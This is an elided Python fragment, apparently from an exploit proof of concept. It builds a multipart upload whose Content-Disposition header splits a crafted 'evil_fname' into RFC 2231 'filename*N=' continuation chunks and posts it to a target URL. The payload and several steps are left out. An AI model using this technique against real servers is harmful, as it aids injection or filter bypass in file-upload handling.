...
def slice(evil_fname):
    length = 555
    fname_list = [evil_fname[i:i+length] for i in range(0, len(evil_fname), length)]
    result = ""
    for index in range(0,len(fname_list)):
        result = result + f"filename*{str(index)}={fname_list[index]};"
    return result
...
def CreateBody(filename, fieldname, strBoundary,exp):
    ...
    result = slice(evil_fname)
    # print(result)
    sData.append('Content-Disposition: form-data; name="%s";' % fieldname + result)
...
def uploadfile(http_url, filename, fieldname,exp):        
    ...
    if True == bRet:
        ...
        response = session.post(http_url,data=http_body,headers=headers,proxies=proxies)
        # get response
        msg = response.text
